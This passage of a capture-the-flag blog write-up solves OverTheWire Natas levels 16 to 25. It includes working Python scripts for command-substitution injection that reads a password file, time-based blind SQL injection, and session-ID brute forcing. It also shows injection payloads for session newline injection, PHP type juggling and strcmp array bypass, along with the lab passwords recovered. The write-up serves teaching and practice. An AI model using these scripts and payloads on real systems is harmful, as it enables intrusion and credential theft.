<p>}</p>

<p>if($key != &ldquo;&rdquo;) {</p>

<pre><code>if(preg_match('/[;|&amp;`\'"]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}
</code></pre>

<p>}
?>
```</p>

<p>Right, this is similar to level 9. This time, however, there is character filtering in place, so we can&rsquo;t use any of these: <code>;|&amp;`\&lsquo;&ldquo;</code>. So there is no way to inject or chain commands..at the first glance! There is one useful character that is not filtered! The dollar sign! This is used in the bash shell in the same way as the backticks: for <a href="http://bash.cyberciti.biz/guide/Command_substitution">command substitution</a></p>

<p>Basically, you can use it to run a command and store its output in a variable or display it with the <em>echo</em> command. It looks like this:</p>

<p><code>plain
root@kali:~# echo $(whoami)
root
</code></p>

<p>So we want to bruteforce the password in the way we did before. Whatever we run with the $() command will be placed inside the $key variable, which is passed to grep against the dictionary file. If there is a match, the words containing it are displayed, else nothing is displayed. This is the behavior we will exploit for True and False values with our injection</p>

<p>Let&rsquo;s test it first. In the form field, I injected <code>$(echo matrix)</code>, and that return all the matches for that word:</p>

<p>``` plain
Output:</p>

<p>matrix
matrix&rsquo;s
matrixes
```</p>

<p>The code executed by the server ends up being <code>grep -i matrix dictionary.txt</code>. Now, if I inject a non-existent word, there is no output. So to check for the password, we will use a nested grep inside the main grep, that will look like this: <code>$(grep -E ^a.* /etc/natas_webpass/natas17)matrix</code>. This checks if the password starts with a, and we will then iterate over all characters. Let&rsquo;s imagine what happens if a is the first character of the password:</p>

<ul>
<li><p>the nested grep that we injected returns a, which is appended to the word we passed after, matrix in this case, so the server-side grep looks for the word amatrix in the dictionary file, and since that doesn&rsquo;t exist, nothing is returned. So we know that if nothing is returned, we had a match</p></li>
<li><p>there is no match for the nested grep, so the matrix word remains unchanged, and the server returns all the matrix words, which means there was no match for the character we tried in the password</p></li>
</ul>


<p>To automate the injection process, I wrote a Python script again:</p>

<p>``` python</p>

<h1>!/usr/bin/env python</h1>

<p>import requests</p>

<p>testchars = &ldquo;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&rdquo;
index = 0
passwd = &ldquo;&rdquo;</p>

<p>while index != 32:</p>

<pre><code>for char in testchars:
        passwd += char
        payload = {'needle': "$(grep -E ^" + passwd + ".* /etc/natas_webpass/natas17)matrix", 'submit': 'Search'}      
        guess = requests.post('http://natas16.natas.labs.overthewire.org/?needle=',                             
                             auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
                             params = payload)                                                        
        response = guess.text
        print "Trying: ", passwd
        if "matrix" not in response:
            print "Password: ", passwd
            index += 1
            break
        else:
            # keep the chars that matched
            passwd = passwd[:-1]
</code></pre>

<p>print &ldquo;Done! Password: &rdquo;, passwd
```</p>

<p>And the output:</p>

<p><code>plain
Password:  8
Password:  8P
Password:  8Ps
Password:  8Ps3
Password:  8Ps3H
Password:  8Ps3H0
Password:  8Ps3H0G
Password:  8Ps3H0GW
Password:  8Ps3H0GWb
Password:  8Ps3H0GWbn
Password:  8Ps3H0GWbn5
Password:  8Ps3H0GWbn5r
Password:  8Ps3H0GWbn5rd
Password:  8Ps3H0GWbn5rd9
Password:  8Ps3H0GWbn5rd9S
Password:  8Ps3H0GWbn5rd9S7
Password:  8Ps3H0GWbn5rd9S7G
Password:  8Ps3H0GWbn5rd9S7Gm
Password:  8Ps3H0GWbn5rd9S7GmA
Password:  8Ps3H0GWbn5rd9S7GmAd
Password:  8Ps3H0GWbn5rd9S7GmAdg
Password:  8Ps3H0GWbn5rd9S7GmAdgQ
Password:  8Ps3H0GWbn5rd9S7GmAdgQN
Password:  8Ps3H0GWbn5rd9S7GmAdgQNd
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdk
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkh
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhP
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
Done! Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
</code></p>

<p>Cool, we have the password for the next level: <code>8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</code></p>

<h3>Level 17</h3>

<p><img class="center" src="/images/overthewire/natas/natas15.png" title="&lsquo;natas17&rsquo; &lsquo;natas 17&rsquo;" ></p>

<p>Again, a level similar to a previous one. This will be another case of SQL injection:</p>

<p>``` php
&lt;?</p>

<p>/<em>
CREATE TABLE <code>users</code> (
  <code>username</code> varchar(64) DEFAULT NULL,
  <code>password</code> varchar(64) DEFAULT NULL
);
</em>/</p>

<p>if(array_key_exists(&ldquo;username&rdquo;, $_REQUEST)) {</p>

<pre><code>$link = mysql_connect('localhost', 'natas17', '&lt;censored&gt;');
mysql_select_db('natas17', $link);

$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query&lt;br&gt;";
}

$res = mysql_query($query, $link);
if($res) {
if(mysql_num_rows($res) &gt; 0) {
    //echo "This user exists.&lt;br&gt;";
} else {
    //echo "This user doesn't exist.&lt;br&gt;";
}
} else {
    //echo "Error in query.&lt;br&gt;";
}

mysql_close($link);
</code></pre>

<p>} else {
?>
```</p>

<p>We know the database is vulnerable, but nothing is displayed to the screen, because the <em>echo</em> statements are commented out. So we&rsquo;re going in blind! To determine if the database returns True or False to our query, we can use time-based SQL injection, by making the database load longer if our query is true, and normal if not. I tested it with this injection string: <code>natas18" AND SLEEP(5)&mdash; </code>. As expected, since the user natas18 exists, the page took 5 seconds to load. When the username didn&rsquo;t exist, it loaded instantly. So the sleep function is executed if the previous part of the query was true, but not if it&rsquo;s false. With this in mind, I modified the Python script I used before:</p>

<p>``` python
import requests</p>

<p>passwd = &ldquo;&rdquo;
testchars = &ldquo;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&rdquo;
index = 0
while index &lt; len(testchars):</p>

<pre><code>query = {'username': 'natas18" and password like binary ' + '"' + passwd + testchars[index] + '%" ' + 'and sleep(15)-- ', 'submit': 'Check existence'}
try:
    guess = requests.post('http://natas17.natas.labs.overthewire.org/', \
                      auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),\
                      params = query, \
                      timeout=10) # how many seconds to wait for a response
except requests.Timeout:
    passwd += testchars[index]
    print 'Password: ', passwd
    index = 0
    continue
index += 1
</code></pre>

<p>print &lsquo;Done! Password is &rsquo;, passwd
```</p>

<p>This took long because I had to use higher values for sleep() and timeout..the script kept stopping early with shorter times. Anyway, skipping the build-up output, the passwod is <code>xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</code></p>

<h3>Level 18</h3>

<p><img class="center" src="/images/overthewire/natas/natas18.png" title="&lsquo;natas18&rsquo; &lsquo;natas 18&rsquo;" ></p>

<p>``` php
&lt;?</p>

<p>$maxid = 640; // 640 should be enough for everyone</p>

<p>function isValidAdminLogin() {</p>

<pre><code>if($_REQUEST["username"] == "admin") {
/* This method of authentication appears to be unsafe and has been disabled for now. */
    //return 1;
}

return 0;
</code></pre>

<p>}</p>

<p>function isValidID($id) {</p>

<pre><code>return is_numeric($id);
</code></pre>

<p>}</p>

<p>function createID($user) {</p>

<pre><code>global $maxid;
return rand(1, $maxid);
</code></pre>

<p>}</p>

<p>function debug($msg) {</p>

<pre><code>if(array_key_exists("debug", $_GET)) {
    print "DEBUG: $msg&lt;br&gt;";
}
</code></pre>

<p>}</p>

<p>function my_session_start() {</p>

<pre><code>if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
if(!session_start()) {
    debug("Session start failed");
    return false;
} else {
    debug("Session start ok");
    if(!array_key_exists("admin", $_SESSION)) {
    debug("Session was old: admin flag set");
    $_SESSION["admin"] = 0; // backwards compatible, secure
    }
    return true;
}
}

return false;
</code></pre>

<p>}</p>

<p>function print_credentials() {</p>

<pre><code>if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
print "You are an admin. The credentials for the next level are:&lt;br&gt;";
print "&lt;pre&gt;Username: natas19\n";
print "Password: &lt;censored&gt;&lt;/pre&gt;";
} else {
print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
}
</code></pre>

<p>}</p>

<p>$showform = true;
if(my_session_start()) {</p>

<pre><code>print_credentials();
$showform = false;
</code></pre>

<p>} else {</p>

<pre><code>if(array_key_exists("username", $_REQUEST) &amp;&amp; array_key_exists("password", $_REQUEST)) {
session_id(createID($_REQUEST["username"]));
session_start();
$_SESSION["admin"] = isValidAdminLogin();
debug("New session started");
$showform = false;
print_credentials();
}
</code></pre>

<p>}</p>

<p>?>
```</p>

<p>This is a lot of code, but first let&rsquo;s see its behavior. When you enter something in the form, a random PHPSESSID between 1 and 640 is created. Then you see the message that you are logged in as a regular user. If you turn debug on and try tampering with the cookie, you will see the message that the session was old and the admin flag was set. The objective appears to be to log in with an admin session ID, and then the credentials for the next level will be printed to the screen. The first time I looked over the code and noticed the fact that the $maxid can be predicted and bruteforced, I thought that&rsquo;s the way to go, but first to understand the code:</p>

<ul>
<li><p>the $maxid holds the maximum value of a PHPSESSID &ndash;> 640</p></li>
<li><p>isValidAdminLogin() just returns 0, so whenever it&rsquo;s called it will set the admin session ID to 0 (not what we want)</p></li>
<li><p>isValidID($id) returns True if the ID is a valid number or numeric string, False otherwise</p></li>
<li><p>createID($user) this is the function that creates the PHPSESSID, with a random value between 1 and 640 (predictable and not long to bruteforce, not what we want in a session ID)</p></li>
<li><p>debug($msg) this just prints messages such as session started, etc.</p></li>
<li><p>my_session_start() this starts a session if there is a valid PHPSESSID cookie, and sets the admin session ID to 0 if it doesn&rsquo;t exist in the $_SESSION array</p></li>
<li><p>print_credentials() prints the password we&rsquo;re after if there is an admin session ID that&rsquo;s set to 1 in the $_SESSION array. Otherwise it just prints a regular message</p></li>
</ul>


<p>Well, the main vulnerabilities are the predictable session ID and the fact that the session starts based on the existence and validity of a cookie, which we can freely control. Since we need to be admin for the next level, we have to bruteforce the session cookies until we hit upon the one with the admin flag set to 1. Python to the rescue again:</p>

<p>``` python
import requests</p>

<p>success = &lsquo;You are an admin&rsquo;
session_id = 0
while session_id &lt; 640:</p>

<pre><code>cookie = {'PHPSESSID': str(session_id)}
print 'Trying with session ID: ' + str(session_id)
guess = requests.get('http://natas18.natas.labs.overthewire.org/', \
                      auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), \
                      cookies=cookie)
if success in guess.text:
    print guess.text
    print 'Admin session ID was: ' + str(session_id)
    break
session_id += 1
</code></pre>

<p>```</p>

<p>I ran it and it discovered the admin session ID was 46. Password for the next level is <code>4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</code></p>

<h3>Level 19</h3>

<p><img class="center" src="/images/overthewire/natas/natas19.png" title="&lsquo;natas19&rsquo; &lsquo;natas 19&rsquo;" ></p>

<p>We don&rsquo;t have source code this time and apparently the session IDs aren&rsquo;t sequential anymore..Let&rsquo;s see. I logged in with some dummy values and noticed the PHPSESSID cookie is hex encoded now. Decoding it..surprise! It looked like this: <code>512-admin</code>. <em>admin</em> was what I put in the username field. I tried more bogus values for username and password and noticed that the session ID cookie is always constructed like this: <code><em>random number-username</em></code>. So again, brute forcing to the rescue! Since I didn&rsquo;t know how much of the code from the previous challenge has changed, I assumed the max session ID value remained the same:</p>

<p>``` python
import requests</p>

<p>success = &lsquo;You are an admin&rsquo;
session_id = 0
while session_id &lt; 640:</p>

<pre><code>pattern = str(session_id) + '-admin'
cookie = {'PHPSESSID': pattern.encode('hex')}
print 'Trying with session ID: ' + pattern
guess = requests.get('http://natas19.natas.labs.overthewire.org/', \
                      auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), \
                      cookies=cookie)
if success in guess.text:
    print guess.text
    print 'Admin session ID was: ' + pattern
    print cookie
    break
session_id += 1
</code></pre>

<p>```</p>

<p>And after a while I hit the jackpot with a sessiod ID of <em>381-admin</em>. The password for the next level is <code>eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</code></p>

<h3>Level 20</h3>

<p><img class="center" src="/images/overthewire/natas/natas20.png" title="&lsquo;natas20&rsquo; &lsquo;natas 20&rsquo;" ></p>

<p>Code:</p>

<p>``` php
&lt;?</p>

<p>function debug($msg) {</p>

<pre><code>if(array_key_exists("debug", $_GET)) {
    print "DEBUG: $msg&lt;br&gt;";
}
</code></pre>

<p>}</p>

<p>function print_credentials() {</p>

<pre><code>if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
print "You are an admin. The credentials for the next level are:&lt;br&gt;";
print "&lt;pre&gt;Username: natas21\n";
print "Password: &lt;censored&gt;&lt;/pre&gt;";
} else {
print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
}
</code></pre>

<p>}</p>

<p>/<em> we don&rsquo;t need this </em>/
function myopen($path, $name) {</p>

<pre><code>//debug("MYOPEN $path $name"); 
return true; 
</code></pre>

<p>}</p>

<p>/<em> we don&rsquo;t need this </em>/
function myclose() {</p>

<pre><code>//debug("MYCLOSE"); 
return true; 
</code></pre>

<p>}</p>

<p>function myread($sid) {</p>

<pre><code>debug("MYREAD $sid"); 
if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
debug("Invalid SID"); 
    return "";
}
$filename = session_save_path() . "/" . "mysess_" . $sid;
if(!file_exists($filename)) {
    debug("Session file doesn't exist");
    return "";
}
debug("Reading from ". $filename);
$data = file_get_contents($filename);
$_SESSION = array();
foreach(explode("\n", $data) as $line) {
    debug("Read [$line]");
$parts = explode(" ", $line, 2);
if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
}
return session_encode();
</code></pre>

<p>}</p>

<p>function mywrite($sid, $data) {</p>

<pre><code>// $data contains the serialized version of $_SESSION
// but our encoding is better
debug("MYWRITE $sid $data"); 
// make sure the sid is alnum only!!
if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
debug("Invalid SID"); 
    return;
}
$filename = session_save_path() . "/" . "mysess_" . $sid;
$data = "";
debug("Saving in ". $filename);
ksort($_SESSION);
foreach($_SESSION as $key =&gt; $value) {
    debug("$key =&gt; $value");
    $data .= "$key $value\n";
}
file_put_contents($filename, $data);
chmod($filename, 0600);
</code></pre>

<p>}</p>

<p>/<em> we don&rsquo;t need this </em>/
function mydestroy($sid) {</p>

<pre><code>//debug("MYDESTROY $sid"); 
return true; 
</code></pre>

<p>}
/<em> we don&rsquo;t need this </em>/
function mygarbage($t) {</p>

<pre><code>//debug("MYGARBAGE $t"); 
return true; 
</code></pre>

<p>}</p>

<p>session_set_save_handler(</p>

<pre><code>"myopen", 
"myclose", 
"myread", 
"mywrite", 
"mydestroy", 
"mygarbage");
</code></pre>

<p>session_start();</p>

<p>if(array_key_exists(&ldquo;name&rdquo;, $_REQUEST)) {</p>

<pre><code>$_SESSION["name"] = $_REQUEST["name"];
debug("Name set to " . $_REQUEST["name"]);
</code></pre>

<p>}</p>

<p>print_credentials();</p>

<p>$name = &ldquo;&rdquo;;
if(array_key_exists(&ldquo;name&rdquo;, $_SESSION)) {</p>

<pre><code>$name = $_SESSION["name"];
</code></pre>

<p>}</p>

<p>?>
```</p>

<p>This is similar to the previous challenges, we still need the $_SESSION array to contain a key named <em>admin</em> with the value of 1. The code writes the session data to a file and that is where it will read the session ID from (the name of the file is the session ID). First, let&rsquo;s look at the debug output when we change our name: <a href="http://natas20.natas.labs.overthewire.org/index.php?name=admin&amp;debug">http://natas20.natas.labs.overthewire.org/index.php?name=admin&amp;debug</a></p>

<p>``` plain
DEBUG: MYREAD sjj8g13u1f3ueiogqdfgf3jin1 // debug(&ldquo;MYREAD $sid&rdquo;);
DEBUG: Reading from /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1 // debug(&ldquo;Reading from &rdquo;. $filename);
DEBUG: Read [name admin] // debug(&ldquo;Read [$line]&rdquo;);
DEBUG: Read [] // debug(&ldquo;Read [$line]&rdquo;);
DEBUG: Name set to admin // debug(&ldquo;Name set to &rdquo; . $_REQUEST[&ldquo;name&rdquo;]);</p>

<p>DEBUG: MYWRITE sjj8g13u1f3ueiogqdfgf3jin1 name|s:5:&ldquo;admin&rdquo;; // debug(&ldquo;MYWRITE $sid $data&rdquo;);
DEBUG: Saving in /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1 // debug(&ldquo;Saving in &rdquo;. $filename);
DEBUG: name => admin // debug(&ldquo;$key => $value&rdquo;);
```</p>

<p>I placed the corresponding PHP code to the same line with the output for convenience. Now to analyze the relevant code:</p>

<ul>
<li><p><strong>function mywrite($sid, $data)</strong> &ndash; after checking that the session ID contains alphanumeric characters only, it sets the path where the session data will be used. The file looks like <em>mysess_SID</em>, see in the output above. Then it sorts the $_SESSION array by its keys and iterates over the array as key => value. In my example, you can see from the output <code>name => admin</code> that <em>name</em> is the key and <em>admin</em> is the value. Then the key and value are written to the file as follows: <code>$data .= &ldquo;$key $value\n&rdquo;;</code>. So the data will look like this: <em>name admin</em> followed by a newline.</p></li>
<li><p><strong>function myread($sid)</strong> &ndash; this function reads the data from the file and breaks the string into an array, split by the delimiter, which in this case is the newline. Then the key and value are separated by a space. Basically, this reads what was written earlier in the file</p></li>
</ul>


<p>We want to focus on the <em>mywrite</em> function because that&rsquo;s the actual code that writes the data that we passed to the server. And the code that needs our attention is this:</p>

<p>``` php
foreach($_SESSION as $key => $value) {</p>

<pre><code>    debug("$key =&gt; $value");
    $data .= "$key $value\n"; 
</code></pre>

<p>```</p>

<p>We know that to get the password for the next level, the $_SESSION array has to contain a key / value pair of <em>admin => 1</em>. And the <em>mywrite</em> function does the writing of this data for us..so all we need is to find a way to inject it. But if you look at how data is written to the file, you will notice the newline delimiter&hellip;what if we can inject another key / value pair after our initial input? We currently have this: <em>name => admin</em> by entering <em>admin</em> in the form. But if we add a newline character we can then insert a new key / value pair that matches the expectations of the server in order to give us the password. So what we want to inject is <code>admin\nadmin 1</code>. And then the session data would look like this:</p>

<p><code>plain
name admin
admin 1
</code></p>

<p>Since we need to URL encode the carriage return and space, the injection looks like this: <code>admin%0dadmin%201</code>. So I passed it to the URL like this: natas20.natas.labs.overthewire.org/index.php?debug&amp;name=admin%0Aadmin%201 and here&rsquo;s the output:</p>

<p>``` plain
DEBUG: MYREAD sjj8g13u1f3ueiogqdfgf3jin1
DEBUG: Reading from /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1
DEBUG: Read [name admin]
DEBUG: Read [admin 1]
DEBUG: Read []
DEBUG: Name set to admin admin 1
You are an admin. The credentials for the next level are:</p>

<p>Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</p>

<p>DEBUG: MYWRITE sjj8g13u1f3ueiogqdfgf3jin1 name|s:13:&ldquo;admin admin 1&rdquo;;admin|s:1:&ldquo;1&rdquo;;
DEBUG: Saving in /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1
DEBUG: admin => 1
DEBUG: name => admin admin 1
```</p>

<p>And we successfully acquired the next password: <code>IFekPyrQXftziDEsUr3x21sYuahypdgJ</code></p>

<h3>Level 21</h3>

<p><img class="center" src="/images/overthewire/natas/natas21.png" title="&lsquo;natas21&rsquo; &lsquo;natas 21&rsquo;" ></p>

<p>We need to satisfy the same requirements as before to get next password:</p>

<p>``` php
&lt;?</p>

<p>function print_credentials() {</p>

<pre><code>if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
print "You are an admin. The credentials for the next level are:&lt;br&gt;";
print "&lt;pre&gt;Username: natas22\n";
print "Password: &lt;censored&gt;&lt;/pre&gt;";
} else {
print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
}
</code></pre>

<p>}</p>

<p>session_start();
print_credentials();</p>

<p>?>
```</p>

<p><img class="center" src="/images/overthewire/natas/natas21css.png" title="&lsquo;natas21css&rsquo; &lsquo;natas 21css&rsquo;" ></p>

<p>This page allows you to play with some CSS values. Also the session ID for this page is different than the other one.</p>

<p>``` php
&lt;?</p>

<p>session_start();</p>

<p>// if update was submitted, store it
if(array_key_exists(&ldquo;submit&rdquo;, $_REQUEST)) {</p>

<pre><code>foreach($_REQUEST as $key =&gt; $val) {
$_SESSION[$key] = $val;
}
</code></pre>

<p>}</p>

<p>if(array_key_exists(&ldquo;debug&rdquo;, $_GET)) {</p>

<pre><code>print "[DEBUG] Session contents:&lt;br&gt;";
print_r($_SESSION);
</code></pre>

<p>}</p>

<p>// only allow these keys
$validkeys = array(&ldquo;align&rdquo; => &ldquo;center&rdquo;, &ldquo;fontsize&rdquo; => &ldquo;100%&rdquo;, &ldquo;bgcolor&rdquo; => &ldquo;yellow&rdquo;);
$form = &ldquo;&rdquo;;</p>

<p>$form .= &lsquo;<form action="index.php" method="POST">&rsquo;;
foreach($validkeys as $key => $defval) {</p>

<pre><code>$val = $defval;
if(array_key_exists($key, $_SESSION)) {
$val = $_SESSION[$key];
} else {
$_SESSION[$key] = $val;
}
$form .= "$key: &lt;input name='$key' value='$val' /&gt;&lt;br&gt;";
</code></pre>

<p>}
$form .= &lsquo;<input type="submit" name="submit" value="Update" />&rsquo;;
$form .= &lsquo;</form>&rsquo;;</p>

<p>$style = &ldquo;background-color: &rdquo;.$<em>SESSION[&ldquo;bgcolor&rdquo;].&ldquo;; text-align: &rdquo;.$</em>SESSION[&ldquo;align&rdquo;].&ldquo;; font-size: &rdquo;.$_SESSION[&ldquo;fontsize&rdquo;].&ldquo;;&rdquo;;
$example = &ldquo;<div style='$style'>Hello world!</div>&rdquo;;</p>

<p>?>
```</p>

<p>If you turn on debug, you can see the contents of the $_SESSION array:</p>

<p><code>plain
[DEBUG] Session contents:
Array ( [align] =&gt; center [fontsize] =&gt; 100% [bgcolor] =&gt; blue [submit] =&gt; Update )
</code></p>

<p>Again we want to insert the pair <em>admin => 1</em> in the array, but the code only allows those 3 keys, so we can&rsquo;t POST what we want. But if we look at this code:</p>

<p>``` php
// if update was submitted, store it
if(array_key_exists(&ldquo;submit&rdquo;, $_REQUEST)) {</p>

<pre><code>foreach($_REQUEST as $key =&gt; $val) {
$_SESSION[$key] = $val;
}
</code></pre>

<p>}
```</p>

<p>As long as the key <em>submit</em> exists in the $<em>REQUEST array, it will take the key / value pairs in the $</em>REQUEST array and set them in the $_SESSION array. This is exactly what we want! But we can&rsquo;t POST our values because of the validity checks. Reading through the PHP manual I saw this:</p>

<blockquote><p>$<em>REQUEST — An associative array that by default contains the contents of $</em>GET, $<em>POST and $</em>COOKIE.</p>

<p>The variables in $_REQUEST are provided to the script via the GET, POST, and COOKIE input mechanisms and therefore could be modified by the remote
user and cannot be trusted.</p></blockquote>

<p>Well, we have control of what gets passed to $_REQUEST, and the code inserts whatever we give it as long as the key <em>submit</em> exists. Instead of POST'ing, I modified the HTML using Firebug to:</p>

<p><code>html
bgcolor:
&lt;input value="1" name="admin"&gt;
</code></p>

<p>On the CSS page a new session ID was issued: <code>4nhuf71ckmm80osqvn1s8s8bd6</code>. I pasted it in the session ID of the page that should give us credentials and refreshed:</p>

<p>``` plain
You are an admin. The credentials for the next level are:</p>

<p>Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```</p>

<h3>Level 22</h3>

<p><img class="center" src="/images/overthewire/natas/natas22.png" title="&lsquo;natas22&rsquo; &lsquo;natas 22&rsquo;" ></p>

<p>Pretty blank, eh? Let&rsquo;s look at the code:</p>

<p>``` php</p>

<p>&lt;?
session_start();</p>

<p>if(array_key_exists(&ldquo;revelio&rdquo;, $_GET)) {</p>

<pre><code>// only admins can reveal the password
if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
header("Location: /");
}
</code></pre>

<p>}
?></p>

<p>&lt;?</p>

<pre><code>if(array_key_exists("revelio", $_GET)) {
print "You are an admin. The credentials for the next level are:&lt;br&gt;";
print "&lt;pre&gt;Username: natas23\n";
print "Password: &lt;censored&gt;&lt;/pre&gt;";
}
</code></pre>

<p>?>
```</p>

<p>Well, it looks like all you have to do is pass a GET parameter named <em>revelio</em> and receive the password. But if you&rsquo;re not an admin, you will just be redirected to the same page via a Location header. I couldn&rsquo;t think of a way to fool the page that I&rsquo;m admin, but I tried messing with the headers,URL and session ID, with no success. However, when I just decided to look at the response to my request in Burp, the answer was in the HTML:</p>

<p><code>plain
You are an admin. The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE&lt;/pre&gt;
</code></p>

<p>After receiving this response the browser made another request..but at this point it didn&rsquo;t matter :D</p>

<h3>Level 23</h3>

<p><img class="center" src="/images/overthewire/natas/natas23.png" title="&lsquo;natas23&rsquo; &lsquo;natas 23&rsquo;" ></p>

<p>Here we have to input a password to login. Let&rsquo;s see the code:</p>

<p>``` plain
&lt;?php</p>

<pre><code>if(array_key_exists("passwd",$_REQUEST)){
    if(strstr($_REQUEST["passwd"],"iloveyou") &amp;&amp; ($_REQUEST["passwd"] &gt; 10 )){
        echo "&lt;br&gt;The credentials for the next level are:&lt;br&gt;";
        echo "&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;";
    }
    else{
        echo "&lt;br&gt;Wrong!&lt;br&gt;";
    }
}
// morla / 10111
</code></pre>

<p>?><br/>
```</p>

<p>We will get the credentials if we enter a password that contains the string <em>iloveyou</em> and that is larger than 10. But how can a string be compared to an integer? PHP manual to the rescue! According to the <a href="https://secure.php.net/manual/en/language.operators.comparison.php">Comparison Operators</a> section:</p>

<blockquote><p>If you compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison
performed numerically.</p></blockquote>

<p><a href="https://secure.php.net/manual/en/language.types.string.php#language.types.string.conversion">So how is the string converted to a number?</a></p>

<blockquote><p>If the string does not contain any of the characters &lsquo;.&rsquo;, &lsquo;e&rsquo;, or &lsquo;E&rsquo; and the numeric value fits into integer type limits (as defined by
PHP_INT_MAX), the string will be evaluated as an integer. In all other cases it will be evaluated as a float.</p>

<p>The value is given by the initial portion of the string. If the string starts with valid numeric data, this will be the value used. Otherwise, the
value will be 0 (zero).</p></blockquote>

<p>So all we have to do is enter a password that starts with a number greater than 50, followed by the <em>iloveyou</em> string, something like <em>50iloveyou</em>:</p>

<p>``` plain
The credentials for the next level are:</p>

<p>Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
```</p>

<p>// (I thought at the beginning that the comment was related to the challenge, but it turns out that&rsquo;s the handle of the creator of the challenge).</p>

<h3>Level 24</h3>

<p><img class="center" src="/images/overthewire/natas/natas23.png" title="&lsquo;natas24&rsquo; &lsquo;natas 24&rsquo;" ></p>

<p>``` php
&lt;?php</p>

<pre><code>if(array_key_exists("passwd",$_REQUEST)){
    if(!strcmp($_REQUEST["passwd"],"&lt;censored&gt;")){
        echo "&lt;br&gt;The credentials for the next level are:&lt;br&gt;";
        echo "&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;";
    }
    else{
        echo "&lt;br&gt;Wrong!&lt;br&gt;";
    }
}
// morla / 10111
</code></pre>

<p>?><br/>
```</p>

<p>This level is centered around exploiting the <em>strcmp</em> function. This function takes 2 strings as arguments and performs a case sensitive, binary safe string comparison:</p>

<p><code>plain
int strcmp ( string $str1 , string $str2 )
Returns &lt; 0 if str1 is less than str2; &gt; 0 if str1 is greater than str2, and 0 if they are equal.
</code></p>

<p>When reading the user contributed notes in the manual, I noticed the mention of the necessity for both parameters to be strings, otherwise the return values would be unexpected, especially if given something like an array. Then I searched for some more information about the subject, check <a href="http://turbochaos.blogspot.jp/2013/08/exploiting-exotic-bugs-php-type-juggling.html">Chaotic Security blog</a> and the <a href="https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet">OWASP PHP security cheatsheet</a>. If you pass an array to the function, it will return NULL, and PHP will treat it as a 0, hence fooling the code that you provided the correct password. So I did it like this: <a href="http://natas24.natas.labs.overthewire.org/?passwd">http://natas24.natas.labs.overthewire.org/?passwd</a>[]=pwn</p>

<p>``` plain
Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23</p>

<p>The credentials for the next level are:</p>

<p>Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
```</p>

<h3>Level 25</h3>

<p><img class="center" src="/images/overthewire/natas/natas25.png" title="&lsquo;natas25&rsquo; &lsquo;natas 25&rsquo;" ></p>

<p>Here we have a page with a quote that we can choose to view in English or German.</p>

<p>``` php
&lt;?php</p>

<pre><code>// cheers and &lt;3 to malvina
// - morla

function setLanguage(){
    /* language setup */
    if(array_key_exists("lang",$_REQUEST))
        if(safeinclude("language/" . $_REQUEST["lang"] ))
            return 1;
    safeinclude("language/en"); 
}

function safeinclude($filename){
    // check for directory traversal
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if(strstr($filename,"natas_webpass")){
        logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    // add more checks...

    if (file_exists($filename)) { 
        include($filename);
        return 1;
    }
    return 0;
}

function listFiles($path){
    $listoffiles=array();
